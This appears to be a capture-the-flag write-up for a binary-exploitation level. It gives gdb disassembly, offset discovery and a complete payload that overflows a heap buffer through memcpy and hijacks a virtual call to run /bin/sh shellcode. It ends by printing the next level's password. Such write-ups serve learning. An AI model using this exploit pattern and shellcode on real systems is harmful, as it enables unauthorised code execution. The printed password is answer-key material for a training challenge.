(gdb) disass main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.

(gdb) disass 0x80486f6
   0x80486f6 <_ZN1NC2Ei>:       push   %ebp
   0x80486f7 <_ZN1NC2Ei+1>:     mov    %esp,%ebp
   0x80486f9 <_ZN1NC2Ei+3>:     mov    0x8(%ebp),%eax
   0x80486fc <_ZN1NC2Ei+6>:     movl   $0x8048848,(%eax)
   0x8048702 <_ZN1NC2Ei+12>:    mov    0x8(%ebp),%eax
   0x8048705 <_ZN1NC2Ei+15>:    mov    0xc(%ebp),%edx
   0x8048708 <_ZN1NC2Ei+18>:    mov    %edx,0x68(%eax)
   0x804870b <_ZN1NC2Ei+21>:    pop    %ebp
   0x804870c <_ZN1NC2Ei+22>:    ret


(gdb) disass 0x804870e
   0x804870e <_ZN1N13setAnnotationEPc>: push   %ebp
   0x804870f <_ZN1N13setAnnotationEPc+1>:       mov    %esp,%ebp
   0x8048711 <_ZN1N13setAnnotationEPc+3>:       sub    $0x18,%esp
   0x8048714 <_ZN1N13setAnnotationEPc+6>:       mov    0xc(%ebp),%eax
   0x8048717 <_ZN1N13setAnnotationEPc+9>:       mov    %eax,(%esp)
   0x804871a <_ZN1N13setAnnotationEPc+12>:      call   0x8048520 <strlen@plt>
   0x804871f <_ZN1N13setAnnotationEPc+17>:      mov    0x8(%ebp),%edx
   0x8048722 <_ZN1N13setAnnotationEPc+20>:      add    $0x4,%edx
   0x8048725 <_ZN1N13setAnnotationEPc+23>:      mov    %eax,0x8(%esp)
   0x8048729 <_ZN1N13setAnnotationEPc+27>:      mov    0xc(%ebp),%eax
   0x804872c <_ZN1N13setAnnotationEPc+30>:      mov    %eax,0x4(%esp)
   0x8048730 <_ZN1N13setAnnotationEPc+34>:      mov    %edx,(%esp)
   0x8048733 <_ZN1N13setAnnotationEPc+37>:      call   0x8048510 <memcpy@plt>
   0x8048738 <_ZN1N13setAnnotationEPc+42>:      leave
   0x8048739 <_ZN1N13setAnnotationEPc+43>:      ret


> ltrace ./level9 test
__libc_start_main(0x80485f4, 2, 0xbffff7d4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                                = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                             = 0
_Znwj(108, 0xbffff7d4, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)                                                                        = 0x804a008
_Znwj(108, 5, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)                                                                                 = 0x804a078
strlen("test")                                                                                                                    = 4
memcpy(0x0804a00c, "test", 4)                                                                                                     = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                                                           = 0xb7fce4a0
+++ exited (status 11) +++


in this code we can abuse of the eip register to jump into the string inside the class so that
we can inject some shellcode by the call made into the return at the end of the program.

with:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
we get:

(gdb) r $(python -c "print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag')")
Starting program: /home/user/level9/level9 $(python -c "print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag')")

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info reg
eax            0x41366441       1094083649
ecx            0x67413567       1732326759
edx            0x804a0d4        134521044
ebx            0x804a078        134520952
esp            0xbffff630       0xbffff630
ebp            0xbffff658       0xbffff658
esi            0x0      0
edi            0x0      0
eip            0x8048682        0x8048682 <main+142>
eflags         0x210287 [ CF PF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51


0x41366441 -> A7dA -> Ad7A
so we gott 112 of offset


we got the same shellcode as before:
"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80"

now we can assemble with the address of the copy (0x0804a00c) and the address of the shellcode (0x0804a010):

python -c "print('\x10\xa0\x04\x08' + '\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80' + 'A' * 81 + '\x0c\xa0\x04\x08')"


$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
